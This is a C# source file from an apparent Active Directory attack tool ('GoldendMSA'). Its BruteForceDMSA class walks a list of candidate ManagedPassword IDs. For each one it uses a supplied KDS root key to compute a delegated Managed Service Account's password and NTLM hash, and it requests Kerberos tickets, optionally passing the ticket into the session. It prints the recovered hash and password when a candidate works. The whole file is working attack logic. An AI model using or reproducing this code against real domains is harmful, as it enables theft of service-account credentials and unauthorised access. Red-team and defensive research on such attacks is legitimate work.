using System;
using System.IO;
using System.Security.Principal;

namespace GoldendMSA
{
    public class BruteForceDMSA
    {
        public static void BruteForce(SecurityIdentifier sid, String Base64KDS, String fileName, String username, String DomainName, bool ptt=false, bool verbose=false) {
            (string dcFqdn, string dcIp) = LdapUtils.GetDomainControllerInfoAlt(DomainName);
            if (!String.IsNullOrEmpty(dcIp))
            {
                BruteForceByFile(sid, Base64KDS, fileName, username, dcIp, DomainName, ptt,verbose);
            }
            else
            {
                Console.WriteLine("Faced issues when trying to resolve the DC's IP.");
            }
        }
        public static void BruteForceByFile(SecurityIdentifier sid, String Base64KDS, String fileName, String username, String DCIp, String DomainName, bool ptt, bool verbose)
        {
            try
            {
                string[] lines = File.ReadAllLines(fileName);

                for (int i = 0; i < lines.Length; i++)
                {
                    lines[i] = lines[i].Trim();
                }

                for (int i = 0; i < lines.Length; i++)
                {
                    string line = lines[i];

                    if (string.IsNullOrEmpty(line))
                        continue;

                    line = line.Trim();
                    Base64KDS = Base64KDS.Trim();
                    string managedPasswordID = Program.ProcessComputePwdOptions(sid, Base64KDS, line, null, null, false);
                    byte[] decodedData = Convert.FromBase64String(managedPasswordID);
                    string ntlmHash = Helpers.ConvertBase64ToNTLM(managedPasswordID);
                    if (verbose)
                    {
                        Console.WriteLine("Action: Ask TGT (attempt #" + i + ") for " + DomainName + "\\" + username);
                    }
                    if(Helpers.base64ToAES(username, DomainName, managedPasswordID, true, ptt, verbose) == 1)
                    {
                        Console.WriteLine($"NTLM Hash:\t{ntlmHash}");
                        Console.WriteLine();
                        Console.WriteLine("ManagedPassword-ID:\t" + line);
                        Console.WriteLine();
                        Console.WriteLine("Base64 Encoded Password:\t" + managedPasswordID);
                        Console.WriteLine();
                        break;

                    }
                }
            }
            catch (Exception ex)
            {
                if (verbose)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }
        }
        

    }

    

}
